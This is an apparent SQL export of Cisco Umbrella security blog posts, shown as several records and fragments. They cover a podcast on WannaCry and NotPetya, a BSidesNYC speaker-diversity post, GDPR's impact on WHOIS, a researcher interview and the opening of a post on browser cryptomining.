virus of his own. Marcus Hutchins, also known as MalwareTech, he was arrested for his alleged involvement in a cyber crime of his own. Hutchins is accused of helping create and distribute a malware known as the Kronos Banking Trojan. Kronos was designed to allow hackers to collect and log banker’s online information. It was first made available in 2014 and has been marketed and distributed through AlphaBay, a Marketplace on the dark web. AlphaBay has since been shut down by the DOJ. The bottom line, the man who helped stop the WannaCry hack was arrested on Wednesday.\nMike Storm: On his way back home to the UK, Marcus was stopped at the airport and arrested by the FBI. He was transferred to the state of Wisconsin for a bail hearing and indicted on multiple charges related to the creation and distribution of the Kronos malware, a banking trojan that had been on the black market since about June of 2014. Marcus has denied all the charges and entered a not guilty plea in court. The difficult part for him though is he has been released on bail but forbidden to leave the country, which means he can’t go home. Since his employer is based in LA, Marcus has been staying there until his trial concludes. As for WannaCry, or Wanna Decryptor or WannaCryptor, whatever you want to call it, the registering of the kill switch was not the end.\nSpeaker 16: WannaCry was written in such a way that it was very, very easy to modify even with a hex editor. So, within hours of the back door … sorry, not the back door, but within hours of the kill switch being turned on, people were already modifying it and mapping out that that section so that it wouldn’t shut down. So, it was very easy to modify. EternalBlue, the actual vector, continued to be used in several malware variants up until today still, it’s still very effective, because people just won’t patch. Malware authors learn from each other’s mistakes. They didn’t think it a good idea and somebody else did, they’re gonna steal it. Absolutely they’re gonna keep evolving the idea.\nMike Storm: So, WannaCry’s legacy continues, and it’s not just the variants in the wild that are active. Most news stories you’ll find covering the Bitcoin payments related to WannaCry stopped around August of last year. But in reality, the activity of these wallets has never stopped. There is an active Twitter account entirely devoted to tracking wallet transactions associated with WannaCry. The wallet accounts were reportedly emptied sometime in August of 2017 and the actors behind the campaign, converted the funds from Bitcoin to the more private altcoin called Monero. But the most recent payment to those crypto wallets, because they still exist, came in February of this year.\nSo, whether they are from WannaCry infection specifically or some related malware, the attackers, or at least their attack infrastructure, appeared to be very much still active. Kryptos Logic, Marcus Hutchins’ employer even released a report just a few weeks ago on April 9th, saying that hundreds of thousands of un-patched machines are keeping this whole thing alive. As for who’s responsible and the identities behind the massive spread, it’s really anyone’s guess. News outlets were saying pretty quickly after the attack that it was North Korea and not only was it North Korea, but it was the same actors behind the Sony Pictures hack. Here is former Homeland Security Adviser Tom Bossert.\nTom Bossert: After careful investigation, the United States is publicly attributing the massive WannaCry cyber attacks to North Korea. We do not make this allegation lightly. We do so with evidence and we do so with partners. Other governments and private companies agree. The United Kingdom, Australia, Canada, New Zealand and Japan have seen our analysis and they join us in denouncing North Korea for WannaCry. Commercial partners have also acted. Microsoft traced the attack to cyber affiliates of North Korean government and others in the security community have contributed their analysis. So, two questions there, one, did we do it too slowly? No, my answer is no. I think the most important thing is to do it right and not to do it fast. We took a lot of time to look through classified sensitive information. What we did was rely on, and some of it I can’t share, unfortunately, technical links to previously identified North Korean cyber tools, Tradecraft operational infrastructure, we had to examine a lot and we had to put it together in a way that allowed us to make a confident attribution.\nThe difficulty in attribution is often to figure out who was operating the keyboard on whose behalf. So, those are the two biggest challenges. People operating keyboards all over the world on behalf of a North Korean actor can be launching from places that are not in North Korea. So, that’s one of the challenges behind cyber attribution. We’re comfortable in this case though that it was directed by the government of North Korea. We’re also comfortable in saying that there were actors on their behalf, intermediaries carrying out this attack, and that they had carried out those types of attacks on behalf of the North Korean government in the past. That was one of the Tradecraft routines that allowed us to reach that conclusion. That said, how they operate is often a little mysterious, if we knew better with perfect knowledge, we would be able to address North Korean problem with more clarity.\nMike Storm: So, according to Homeland Security, it was with a high degree of certainty North Korea, based on corroborated evidence from a number of different public and private security groups. Craig and the Talos team did not weigh in on who was responsible for the very reason that you heard Tom Bossert say, attribution is hard. It’s really difficult to be certain who did what for whom. Our friends at Flashpoint, the security intelligence firm, say that it’s more likely, based on linguistic analysis, that WannaCry actually came out of China, and they wrote code to make it seem like it was North Korea. There were other reports that China even blamed the US and not North Korea for the whole situation. So, say it with me, attribution is hard. Now that attackers have seen how effective this WannaCry event was, you can bet they will be looking to modify it and repeat the same kind of attack. According to Craig Williams, that’s already happening. In fact, an attack called Nyetya or NotPetya has proved to be more sophisticated and even more effective than WannaCry. It hit only a couple of months after the WannaCry fallout.\nSpeaker 18: The White House confirmed that Russia was behind a worldwide cyber attack that took place in June of last year. It said the attack, quote “Will be met with international consequences” The White House called the NotPetya attack the most destructive and costly cyber attack in history. The attack caused billions of dollars in damage in North and South America, Europe and Asia. It was part of Russian efforts to destabilize Ukraine which suffered major blows to it’s government, financial and energy institutions. The US now joins the British government in condemning the attack. The White House said it’s reviewing a range of options on how to proceed.\nMike Storm: One of those efforts was to slap sanctions on Russia, which the Treasury Department finally got around to on March 14th of this year. Last year, shortly after we had all recovered from the WannaCry event, another event in June started to spread, and the way it was constructed was so genius, it’s scary.\nCraig Williams: Yeah, I think Nyetya was probably the most advanced piece of malware for 2017. One of the ways I try to explain it to people is, you can think of WannaCry like that ’87 Honda Civic you had in high school. It technically ran, but not well, you have to start it just the right way and be careful how you drove it because the wheels might fall off. Compare that to Nyetya which would be like a BMW m5 Competition Edition. It’s the same ballpark technically, but not performance wise. Nyetya had the fastest scanning algorithm we’ve ever seen, it was multi-threaded and capable of communicating in between the threads so that it could scan an entire IP space in a very, very minimal amount of time. We’re talking tens of thousands of victims a second.\nMike Storm: Nyetya gets it’s name for its similarities to Petya, another form of ransomware. You heard the newscaster say the White House described it as one of the most damaging and costly attacks in history. You might have to check the totals, but it was global and definitely very costly. In fact, FedEx was hit by WannaCry, and they reported their European Express shipping company TNT had to process packages by hand after being hit by Nyetya. Between WannaCry and Nyetya, FedEx reported it would cost a shipping company somewhere around 300 million. Maersk, one of the largest shipping companies in the world, also said the company would see losses in the 300 million range. Merck, the pharmaceuticals company, likewise reported losses of up to 310 million. So, if attackers are looking to do major damage, it appears that they found a pretty effective method. Here’s Craig again on how this attack works.\nCraig Williams: To top it off too, Nyetya was very, very cleverly deployed via what we call a supply chain attack. If you’re not familiar with the term, a supply chain attack is basically where you take advantage of a trusted supply chain, like maybe an applications update system, to actually deploy the malware. That’s the complete opposite of the technique WannaCry used, which is just spread loud and fast. Supply chain attacks are gonna spread and no one’s even gonna know what happened.\nMike Storm: Supply chain attacks are very insidious, they can spread and operate while appearing like normal network traffic, and according to Craig, they can even deploy but lie in wait for just the right moment.\nCraig Williams: Nyetya was very interesting, because it used that supply chain vector, no one knew it was there. It was also super creepy because it was detonated shortly after the assassination of a Ukraine military Intel official. So, from our perspective, effectively what happened was these people implanted this bug through this software called M.E.Doc. M.E.Doc was a piece of tax software used in Ukraine, was only one of two approved tax software packages. I think Reuters published a number that 80% of all systems had it installed. I don’t know how accurate that is, but let’s just say it’s a lot. So, what happened was the attacker basically fished credentials or somehow got his hands on credentials, logged into M.E.Doc’s server, modified the engine X config, and pointed it at their server over at OVH, and then effectively at that point, the M.E.Doc’s update server was just a man-in-the-middle. Unintentionally, the victims are all going through M.E.Doc, straight to OVH and downloading a backdoor binary.\nMike Storm: The assassination that Craig mentioned was a car bombing in Kiev on June 27th of 2017. Maksym Shapoval, a Colonel of Ukraine’s Military Intelligence, was killed in the attack.\nCraig Williams: I think it was staged too. From Tallis’ perspective, it was retaliation. Now, what was really interesting about Nyetya was the fact that it had been spreading inside of these networks completely undetectably for three months. You remember how quickly I said Nyetya spread, what also is the second, quote, “ransomware worm ever”, but unlike most worms, it actually used four different vectors. It was even smart enough to apply the vectors in order of least likely to be noticed. It actually very rarely used EternalBlue or EternalRomance, which were the two code execution vectors. More often than not, it would simply pull the credentials out of memory using a modified version of Mimikatz and then just spread over the windows servers, the domain servers. So, super clever, super, super interesting. They even went and modified the DoublePulsar backdoor that was part of the EternalBlue exploit. So, at this point, EternalBlue had been out for months. I think Microsoft patched it at the beginning of the year. So, everybody was scanning their systems for the DoublePulsar backdoor, which was stage two of EternalBlue. Well, these guys were smart enough to actually go in and modify the response codes, so that even if you scan the systems, it would still come back as not compromised. We’re talking layers upon layers of evasiveness and cleverness.\nThe people who wrote this, not only knew what they were doing from a development standpoint, but they knew what they were doing from a security standpoint and how people would look to detect this. So, incredibly evasive, incredibly fast. I guess the icing on the cake was the fact that it was actually basically a cyber weapon masquerading as crimeware. The reason people called it NotPetya was because it had a ransomware screen similar to Petya, but there were still several gotchas even on that, like using an email address as the primary point of contact. Ransomware has been out since 1986, people know how to get paid. You set up a site on tor, you have them get a key, you verify that and then give them back the key once they put the Bitcoins in the wallet. So, the very fact that they had an email as a primary point of contact, was a real interesting perspective. And then, as our team reverse engineered the binaries, we found out that they literally never saved off a key. So yeah, there is literally no way to recover any of the files, short of finding a problem with the encryption algorithm. So, that’s how we knew it was actually just Wiper malware masquerading as crimeware.\nOne of the more interesting things about it is, think about how it worked, so I mentioned it followed an assassination attempt, so three hours after the assassination attempt, this malware was detonated, and keep in mind it had been spreading for months. So, it’s in, according to Reuters, 80% of all systems associated with Ukraine, and even if it was a US company, if they had a system in Ukraine where they had to pay taxes, they’re gonna have one of those machines in their network. So, for three months that machine has been silently spreading in their network hitting every box it could, getting into everything, and then three hours after that car bombing, they pushed the button, the malware detonates, and all of the systems suddenly completely are wiped. The even creepier part of this is think about the access that they were giving up, this wasn’t just a piece of Wiper malware, this was a full-featured backdoor. This thing allowed them to upload and download files, modify files, turn on key loggers, do anything they wanted, literally anything, and they chose to throw that away to send a political message, presumably.\nMike Storm: So, was the purpose of Nyetya to shift focus off of the car bombing? Or are the two related? The timing is definitely hard to deny, especially considering the bombing happened just before Ukraine’s Constitution Day, which is a celebration of the country’s independence from the Soviet Union. The CIA, though it declined to comment publicly, was quoted as having high confidence that the car bombing and the ransomware attack were both perpetrated by the Russian military. This isn’t the end, as I mentioned, events that have happened since WannaCry and Nyetya, show that hackers are keen to modify these attacks and use them for their own purposes. Just four months after the Nyetya event, a new ransomware variant called Bad Rabbit hit Ukraine, Russia and Eastern Europe, infected thousands of networks and caused hundreds of thousands of dollars in damages. Bad Rabbit wasn’t a worm, but it shared a large portion of code and even the same ransomware lock screen from Nyetya or NotPetya.\nIn October last year, a new variant of WannaCry hit a North Carolina healthcare provider’s network. First Health, the provider, said in a statement that the ransomware hit four thousand endpoints in about a hundred locations in it’s network. Just a few weeks ago, Cisco released it’s 2018 annual Cyber Security Report, and it cites a recent supply chain attack, which is what made Nyetya so sophisticated and successful as we heard Craig describe. In this attack, hackers compromised download servers for the popular Windows maintenance software called Ccleaner. Users looking to download the software, unknowingly also downloaded and installed a trojan backdoor, but the software had a legitimate certificate through a legitimate software provider, which gave the user confidence. According to the report, these type of supply chain attacks are going to increase both in velocity and complexity and they have the potential to hit on a massive scale, but it doesn’t take a huge cybersecurity budget or advanced red team abilities to mitigate some of these attacks.\nMost of the time IT teams just need to keep up with the fundamentals. Patching, segmenting their networks, keeping policies in check, having a strict incident response policy in place and of course backups. Just weeks ago at RSA, the largest security conference in the world, Microsoft vice-president Brad Smith specifically citing the WannaCry event, announced a cybersecurity tech accord. Thirty two other companies, Cisco included, signed a pact of sorts that commits to sharing threat intelligence and to oppose state-sponsored cyber attacks against civilians. Information sharing is a powerful tool, whether you’re a journalist or a Sysadmin or a security researcher, sharing helps expose the magnitude of the problem.\nCraig Williams: By getting that word out and helping people realize that security cannot be an afterthought, they help people carry that message into the boardroom. So, it’s no longer just an IT guy conversation, it’s an executive conversation that security must be taken seriously, that data must be kept secret, and you have to have the proper defenses in place or you could be the next victim.\nMike Storm: Many thanks to Craig for sharing his insight info on this episode.

INSERT INTO `opendns` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (1092, '50% Women Speakers at BSidesNYC', 'Brad Antoniewicz', 'February 2, 2018', 'At BSidesNYC we wanted to offer a more inclusive environment for our attendees so we decided a good first step was to set a goal that 50% of our speakers be women.\nWe didn’t make it – but we tried. In this post, I hope to share with you what we did so that maybe your security conference can make it to 50%\nJust a couple things to note: 1. We didn’t ask anyone their gender and thus all charts that compare counts of men vs women may be inaccurate. 2. There are many ways to set inclusion goals at conferences, my aim here is not to debate the goal itself, but share what we learned pursuing a goal we felt was right for us. 3. Finally, the opinions expressed here are my own, and don’t necessarily reflect that of my employer, conference organizers, or attendees.\nA Warm Welcome\nOur first goal was to offer up a warm welcome to anyone looking at our website. We did this by enlisting supporters, partnering with organizations that shared our views, and creating a welcoming environment.\nEnlist Amazing Supporters\nConferences boil down to the people who attend them and the experiences those attendees have. Before our website had sponsors, speakers, or an agenda, we had a freaking awesome wall of brilliant minds in security – most of which were women. We asked accomplished people within our social circles to sign up as ‘Supporters’ – allowing us to showcase them on our site to draw in a more inclusive crowd.\n\nThis was intentionally meant to send a clear message to attendees and potential speakers: women are welcome, smart people are here.\nSupporting Organizations as Partners\nIn the same vein, we also reached out to groups that support women in technology, such as Women’s Society of Cyberjutsu, Women in Security and Privacy, and the Executive Women’s Forum, offering them free promotion for doing nothing other than letting us show support for them at our conference. Start early though, at least one of these partnerships took 4 months of persistent, mostly unanswered emails.\n\n\nAnti-Harassment Policy\nI’ll never forget the quick request-response I got when I asked one person to be a supporter:\nMe: Would you want to be a Supporter for BSidesNYC, I think you would really help in encouraging more women to attend.\nPerson: Do you have an anti-harassment policy?\nI’m not sure if this soon-to-be-supporter meant to imply that they would only join if we had such a policy, but that’s exactly how I took it. This question was an early indicator that we had enlisted a great supporter – our Anti-Harassment/Code of Conduct Policy not only showed that we were creating a safe place for our attendees, it also gave us clear instruction later on when we needed to handle reports of sexual harassment. You absolutely need this.\nSoliciting CFP Submissions\nA goal of 50% women speakers is deceptively difficult. No self-respecting conference in security would grant someone a technical speaking slot based on their gender or anything other than their knowledge. This means that in order to achieve the goal, not only do you have to spend time reaching out to women, you have to choose those who’ve done amazing research that will likely be accepted by the Call for Papers (CFP) board.\nTo make things even more of a challenge, if you’re only aware of a particular woman’s incredible research through reading their papers or watching videos of their talks, and not by knowing them, you’ll essentially be forced to cold-call these people and ask them to submit.\nSo that’s what we did – we reached out to over 40 women in the months before BSidesNYC, via Slack, Twitter, Email and LinkedIn.\n\n\nJust to contrast, this is effort we spent soliciting speakers who were men:\n\nFinding Women\nAnyone who tells you they can’t find women speakers in security hasn’t tried looking. Our industry may be grossly unbalanced, but that doesn’t mean we don’t have many extremely talented women.\nHere’s a few places to find names to search, figure out if they’re in security, and if they’ve done research your audience might like:\nSearch through talks given at all the major prior conferences\n List of Women Speakers in Tech\nWomen and Tech\nFollow Friday Tweets like these, they’re really good\n#FF #womenintech awesome group! @s0ciabl3ng@hexwaxwing @ivydigitalstorm @emilymaxima @apiratemoo @Dinah_Davis @s3scand0r @cybertri_x @InfoSecSherpa @RachelTobac @asbluecio @_Joyous_ More to come next week. #cybersecurity\n— Marcelle (@marcelle_fsg) January 12, 2018\n\nThe Failed Pitch\nCold-calling is not easy. Initially my pitch to women who I didn’t know was:\nHi! I have a goal to reach 50% women speakers at BSidesNYC, would you consider submitting to the CFP?\n\nKeep in mind I didn’t blast this out to just anyone – I researched loads of women and only contacted the ones I thought previously presented on topics our CFP board would accept. My objective with the pitch was to be succinct while perhaps appealing to their willingness to get behind a good goal.\nWell, it turns out, it is more complicated than that.\nDon’t Promote the Goal, Just Pursue It\nPart of the reason we failed to reach our goal was that it took me too long to realize that if you want 50% women speakers, don’t tell anyone about it. Instead relentlessly pursue the goal without mentioning it. That means no public tweets, no DMs, no emails, no “50% women speakers” banners, no lapel pins, nothing.\nPerhaps unsurprisingly, women (like everyone else) want to be recognized by their technical ability, and not because of their gender. By leading with “I have a goal to reach 50% women speakers”, I was essentially saying “I’m contacting you only because of your gender”.  These women had no clue I already vetted them and I was only reaching out because I admired their work. I was too worried about overcoming the challenge of cold-calling that I didn’t realize I was tragically sabotaging myself in the first couple words.\n\nLooking back on this DM, I remember interpreting the response as “You are being very to the point” rather then, “You are only asking me because I’m a woman”.\nDon’t let the same thing happen to you. Take the time to craft a genuine, personalized and meaningful request to each person you asked. No its not scalable. Here’s the type of approach I switched to later on, that yielded a much better result:\n\nHi! I absolutely loved your work on XYZ, would you consider submitting to the BSidesNYC CFP?\n\n\nThat’s so much better. Although it is hard to say if this new approach was the only deciding factor between these two examples, this person did present at the conference.\nExtend Your CFP Window\nWe increased the amount of time the CFP was open so that we had more time to raise awareness about the conference. It also gave us a little more time to reach out to potential speakers. The data doesn’t show this had a profound impact on submissions, but I have to believe the extra time helped at least a little.\n\nTraditional Problems Still Apply\nJust because you’ve set this ambitious goal of 50% women speakers, doesn’t exclude the fact that travel can a be barrier, especially when you’re a smaller conference (BSidesNYC had about 630 attendees). Even though attendees and speakers came from all over the world, we had the most success soliciting speakers in the same geographic region as the conference.\nThe Internet is full of strange people, don’t expect everyone to believe you’re genuinely interested furthering inclusion in security.\nI hate to break it to you, but people might not want to speak at your conference! Sorry!\nAn Unsettling Dose of Reality\nThe more women you reach out to, the more likely you’ll begin to feel how much of a problem sexual harassment really is. The one positive thing that came out of mentioning the goal was women began to explain a little more deeply why they wouldn’t submit:\n\nIt may not be surprising to the women of our industry, but the latter part of this response totally caught me off guard.\nStand Behind Your Goal\nThe exchange in the previous section was a prelude to some of the issues our industry is facing that you might not be expecting. Over the course of planning for the conference we received and handled anonymous reports of sexual harassment, warnings from women about specific people in the industry, and concerns from multiple speakers about individual attendees whose goal might be to threaten the safe space we created.\nGood thing we had those awesome supporters, they were able to bring a much needed perspective to the mostly male BSidesNYC coordinators.\nAs you pursue your goal, be prepared to revoke tickets, dedicate ‘invisible protection’ for speakers, constantly remind everyone of your anti-harassment policy, issue firm warnings, and be willing to kick someone out of your conference in the spirit of creating a safe place for your attendees.\nMaking/Not Making the Goal\nIn the end, I underestimated how difficult this goal was, started too late, and needed to refine my pitch to women. By the time I figured this all out, the CFP submission period was over. Just by looking at the gender breakdown of the CFP submissions, I knew I didn’t have a chance of making it:\n\nAnother initiative I championed was the BSidesNYC Entrepreneur Track. Instead of completely ditching this goal, I decided to do whatever I could to still honor the intent of inclusion at our event. There was one important thing to note – since it isn’t a technical track, it isn’t subject to the CFP committee review. I still spent a lot of time researching, selectively choosing the speakers, and individually asking them to participate, but this time it was solely up to me to decide who got a speaking slot. You can see how this played out in the graph below.\n\nYou have no idea how happy I was during the brief moment that those red and blue lines met, meaning we had reached our goal of 50% women speakers.\nCheater!\nI have to admit, every time we talk about the goal, a part of me feels like we cheated. When the dust settled, 41% of our speakers were women, but this was mostly due to the Entrepreneur Track. If we only compared general tracks, we’d be at 38%. The further you dice it, you begin to see that our smaller size helps us since a single speaker has a bigger percentage impact compared to larger conferences.\n\nOther Conferences\nI began to grow curious how our conference compared to the larger ones. I took the likely flawed (again, no one was asked their gender) approach of looking at BlackHat and ShmooCon (CFP Metrics and Speakers), then comparing the two.\n\nLooking at this data, perhaps a goal of 50% CFP responses from women might have been better. It’s interesting to see the larger conferences with relatively low percentages. I’d imagine they wouldn’t have the same challenges of getting a balanced CFP response.\nSpeaker Feedback\nWe sent a short survey to some of our speakers asking 4 questions, two of which being: “Do you Identify as a Woman?” and “Why did you submit?”. Eight responded “Yes or Partially” to “Do you identify as a Woman”. This is how those 8 replied to “Why did you submit” (participants could select multiple answers or fill in “other”):\n\nIt’s such a simple answer: If you want more women speakers at your conference, just create a place they want to speak at ', 'Community;Culture;Events;People & Culture;Security Community', 'https://umbrella.cisco.com/blog/2018/02/02/28103/');

While the regulation is intended to protect the privacy of individuals, ironically, it created a last-minute scramble that caused millions of unsolicited emails to be sent around the world notifying customers of updated privacy policies and making requests for marketing consent. The impact of GDPR is being felt not only by businesses and individuals, but also by security researchers, investigators, and those who offer security products and services that rely on WHOIS data. GDPR impacts everyone who processes EU personal data.  To understand that impact, it might be useful to understand who’s involved and how we got to this point. We’ll attempt to provide an overview here, in layman’s terms, before we share our thoughts on how it will impact Cisco Umbrella.  (Feel free to skip to the last section if you’re up to speed on GDPR and WHOIS.)\nWhat is the GDPR?\nIn short, the GDPR is a European Union data protection regulation – the law for all 28 member states. The regulation is a result of years of negotiation and drafting among the European Parliament, Council of the European Union, and European Commission that built upon decades-old privacy principles and the 1995 EU Data Protection Directive. The result was a robust, risk-based data protection law calling for transparency, fairness, and accountability when processing EU personal data.  To drive compliance, the GDPR comes with enhanced penalties for egregious misconduct — up to 20 million Euros (roughly $23.5 million at the time of writing) or 4 percent of the offender’s worldwide annual revenue, whichever is greater. As an EU law, GDPR was intended to protect EU citizens; however, it actually protects anyone within EU borders (citizen, resident, visitor, or otherwise) and applies to companies outside of the EU to the extent they are monitoring activities or offering goods and services to persons physically in the EU, irrespective of citizenship status.\nIANA, ICANN, and WHOIS\nDeveloped mainly for government, academic, and military sites, the Net’s early domain and naming management was the responsibility of a single individual. Jon Postel earned his Ph.D. in Computer Science at UCLA in 1974, and was key in the creation of IANA, the Internet Assigned Numbers Authority. More of a function than an organization, Jon lead IANA, working for USC’s Information Sciences Institute until his death in October 1998. (Side note: A fascinating history of Jon’s contributions and the standards, policies, and culture he helped to create were captured in a web archive dedicated to his honor.)\nICANN (Internet Corporation for Assigned Names and Numbers) was formed in 1998, when USC entered a contract to transition IANA’s functions to a not-for-profit corporation as part of a private-public partnership. IANA became a division of ICANN, which among other things, had responsibility for “IP address space allocation, protocol identifier assignment, generic (gTLD) and country code (ccTLD) Top-Level Domain name system management, and root server system management functions.” As part of this management, ICANN provides accreditation to registrars all around the world, accepting registration and contact information for registered domains and publishing via a protocol or service known as WHOIS.\nWHOIS has been the defacto source for those seeking information for domains and their owners, including names, addresses, emails, and phone numbers for administrative and technical contacts. I had written more here, but since I’m not an attorney (and need to get this blog post approved by our attorneys), I’m scrapping my attempt at more thorough explanation.  What’s important to note is that some registrars have redacted data from WHOIS, while it looks like others may keep publishing. That means the service may end up being less valuable to brand owners, lawyers, and cybersecurity researchers who utilize WHOIS to perform tasks, like identifying malicious domains or researching infringement claims, for example.\nCourtesy of Cisco Security Research Analyst Artsiom Holub\nOn May 17th, ICANN’s board voted to approve a “Temporary Specification.” What’s to note here is the reference to a proposed “tiered-access” system. Under that system, a great deal of personal information will be unavailable to the public, but certain vetted third-parties who have a “legitimate interest” and receive accreditation from ICANN might be granted less restricted levels of access to WHOIS data.\nThe #ICANN Board has voted to adopt the Temporary Specification for gTLD Registration Data.

Registration records create a breadcrumb trail of sorts, and are especially useful when cyber criminals recycle or reuse any of the registration information they provide. KrebsOnSecurity recently challenged a widely-held belief that WHOIS isn’t reliable because cyber criminals don’t use their real information when they register a malicious domain. According to Krebs, “Whether or not cyber crooks do provide their real information is beside the point. ANY information they provide — and especially information that they re-use across multiple domains and cybercrime campaigns — is invaluable to both grouping cybercriminal operations and in ultimately identifying who’s responsible for these activities.” In addition, while some registrars offer WHOIS privacy services, cyber criminals aren’t always willing to pay for these services. Even when they do, a “brief window of visibility” into the details of the registration may be captured and indexed when a registrant moves to a different hosting provider. If a phishing site is only online for a few hours, WHOIS data becomes another tool in the toolbox, providing a point-in-time record that could help to identify and thwart malicious behavior.\nIn speaking with Cisco Security researchers and investigators, it is clear that the registration details in WHOIS records are useful, but they’re not the only breadcrumbs that cyber criminals leave behind. True, our teams utilize a WHOIS classifier used to block domains that may not be very useful in the short term should registration details cease to be published, but our incredible team of dedicated security professionals have other tools in the toolbox in the form of robust classifiers, algorithms, and statistical models we rely on to identify and block threats. Not having WHOIS data is akin to a bank robber who wears a mask. Even if we can’t see the robber’s face, we undoubtedly have other details like height, weight, a description of the getaway vehicle, witness testimony, and surveillance video. Plus, we can see if there are other recent robberies and test for fingerprints or DNA or some other identifying factors. Sure, it would have been easier had the robber not worn a mask, but we expect robbers to disguise themselves, and we have developed ways to get around that. To sum it up, while Cisco Umbrella Investigate customers may soon be unable to view complete WHOIS data in the dashboard as they have in the past, GDPR is not expected to significantly impact our overall ability to identify and block threats.\nUntil the dust settles on GDPR and WHOIS, the security community expects that some cyber criminals may look to take advantage of the uncertainty.

Whether you’re new to security, a seasoned pro, or stumbled upon this blog by accident, we hope you’ll enjoy learning about at the people behind our products. Today, we’re talking to Brad Antoniewicz, Research Manager at Cisco, frequent speaker, blogger, published author, former adjunct professor, and fierce advocate for women in tech.\nCisco Security Research Manager Brad Antoniewicz\nHi Brad! Tell us: What you do at Cisco?\nHi, nice to meet you! My name is Brad and I lead the Research Analyst, CyberLab, and CASI teams within Cisco’s Cloud Security Research group. Together, we identify brand-new threats that impact our customers and build an index of known-good and known-bad entities on the internet. I joined Cisco about two years ago from Intel Security where I led a research team focusing on vulnerability research and automation.\nHow and when did you start taking an interest in technology — and, more specifically, cybersecurity?\nIt all started when I was in my early double-digits —  my mom ran a computer lab at a local middle school, and after school I’d hang out there playing computer games. For the older folks out there, one of the games that always brings back memories is Winter Challenge for DOS!\nEventually my mom saved up and bought a computer for the house, which my older brother and I were completely consumed with. That led to a life of BBSs, War Dialing, and eventually IRC. The next thing I knew, I stopped taking my normal school bus home, and starting taking one that would drop me off at the doorstep of a sweet computer repair job — a job my older brother helped me land.\nWhat personal and professional qualities are important for a career in cybersecurity?\nAs with all jobs: unrelenting passion. You have to love the challenge of solving problems, breaking into systems, and catching bad guys!\nTell us about some of the more interesting research you’ve done.\nOne of my favorite all-time hacks was against those building access card systems. You know, those little black squares next to doors that let you into your office. I wrote some code that would allow you to mimic the access badges given to employees and essentially brute force those. Well, it worked really well and security professionals from all over the place would write me, telling about stories of how they used it to test the security of their organization. I also discovered ways to open any door, in any office, via the network, for specific deployments. It was awesome! It’s been a while since I did that research, but you can find some of the code here https://github.com/brad-anton/proxbrute and https://github.com/brad-anton/VertX\nWhat challenges can we expect from the ever-increasing number of IoT devices, workloads moving to the cloud, and cyber attacks?\nIoT has been impacting the industry in two interesting ways. The first is a massive nuisance: DDoS. Vulnerabilities and lax configuration settings in internet-connected devices like cameras are giving attackers the ability to gain control over these systems and use them on a gigantic scale to flood targets. This flooding is not only a nuisance, it’s used as a diversion tactic.  While an organization is focused on dealing with the flood, actors launch quieter, more directed attacks to break into systems and gain access to sensitive data.\nThe second way IoT is impacting the industry is more of an artifact of technological innovation. Critical infrastructure — like water treatment facilities and power plants of all types — have used embedded systems for years to control core elements of their operation. As internet adoption grew, these older systems connected to the internet so they could be more easily managed and monitored.\nHowever, much has changed in terms of security, and many of the devices and applications still in use weren’t built with the basic security features that are standard in modern operating systems. This has the potential to give attackers the ability to impact physical things by modifying something virtually — for instance, opening the floodgates on a dam. Unfortunately, some individuals and organizations underestimate the potential for loss and treat security reactively instead of proactively.\nHow does your research feed into Cisco products and services?\nThe research my team conducts at Cisco focuses on defending against attackers by understanding every component of an attack and using that knowledge to build systems to detect them automatically. We also spend hours hunting through our data sets to identify new infrastructure, tools, and actors. We then take all of this information and feed it directly into blocking mechanisms that are used by many Cisco products. The impact of our research is freakin’ awesome!\nThanks for your time, Brad! Before you go, tell us something fun or interesting people might not know about you.\nI absolutely love to snowboard! It has been a joy of mine for years, ever since I was a teenager, but I rarely find time to go. One time, after a long period of not snowboarding, I fell so hard that my pants literally fell off. They were the zip-up kind, and two of my friends had to help me up and put my pants back on. When I hear the phrase “catching them with their pants down,” used to describe attackers on the internet, I can’t help but think about the snowboarding incident. Thankfully, I’m much better at catching attackers on the internet than snowboarding!\nWhere can we find you online?\nFind me on Twitter (without having to spell my last name) at @brad_anton.\n\nWant to see Brad’s research in action?

INSERT INTO `opendns` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (1098, 'Mounting Mining Mayhem', 'Patrick Colford and Artsiom Holub', 'December 19, 2017', 'Rise of the Cryptominers\nAs cryptocurrencies continue to increase in value, cryptomining becomes increasingly more lucrative. With Bitcoin nearly reaching $18,000USD/1BTC, speculation that other cryptocurrencies such as Etherium and Monero may hit this mark eventually is rising. Monero is especially interesting given that one of its primary advantages is the relatively low processing power needed to mine it. Given that it is capable of being mined even by consumer grade computers, many organizations have tried to capitalize on this facet of the currency.\n\nLaunched in September of this year, Coinhive is a service that has transformed the internet already in its short life. Coinhive allows users to embed JavaScript API calls to enable anonymous mining of Monero cryptocurrency in browsers. Monero aims to improve on existing cryptocurrency design by obscuring the sender, recipient and amount of every transaction made, as well as making the mining process more egalitarian by lowering processing costs. Though Coinhive as an organization has said they want users to come up with new uses for their service, it’s hard to imagine they wanted users to create apps that then go on to be abused. When programs have no reference to cryptomining at all, how are consumers supposed to make educated choices about their best options?\nCoinhive isn’t the only game in town. Crypto-Loot, launched in October of this year, similarly allows users to embed API calls to have their end users mine Monero silently or publicly. With Monero’s emphasis on privacy and the distributed nature of its mining, how can we accurately gauge its adoption and measure its use?\nHow Deep Do These Mines Go?\nTrying to accurately understand how much cryptomining is going on is challenging. Given that there are several different organizations that allow for anonymous mining, it can be hard to definitively say that a certain amount is being done. A quick search for domains utilizing Coinhive mining pools in top million domains using a service such as censys.io reveals nearly 1,000 domains currently actively mining Monero with the resources of their visitors. The same lookup for Crypto-Loot based mining reveals another hundred hosts monetizing their users. Most of the domains are streaming or torrent websites, where average users spend more time than the median of 1 minute and 50 seconds. We’ve observed an average of 250 visitors every hour to these domains. The torrent sites that have taken advantage of cryptominers are banking on the amount of visitors rather than the length of time spent there:\nPresence of CoinHive cryptominer or kickass[.]cd\nDNS requests per hour for kickass[.]cd as seen through Investigate\nSince less average time spent on a page equals a smaller amount of coins that can be mined, not all of the websites can utilize cryptomining scripts efficiently. In some cases, not so friendly scripts are used and your PC will keep mining even after you have left the page or closed the browser. Another malicious cryptojacking-related event took place earlier this month: cryptojacking of Argentinian Starbucks stores’ WIFI and the embedding cryptomining scripts in GitHub repositories.\nThere’s Crypto In Them Thar Platforms\nAs we have seen, the ability to embed the API calls has opened up new avenues of mining. Making the leap from browsers to apps shouldn’t be a total surprise, but with nearly 50 cryptomining apps legitimately in the Play Store for Android, it seems that we should expect to see more of these in the future. For apps that are found outside of normal distribution channels, or apps that do not disclose that they mine, this raises the question of what the appropriate security stance should be.\nBy itself, 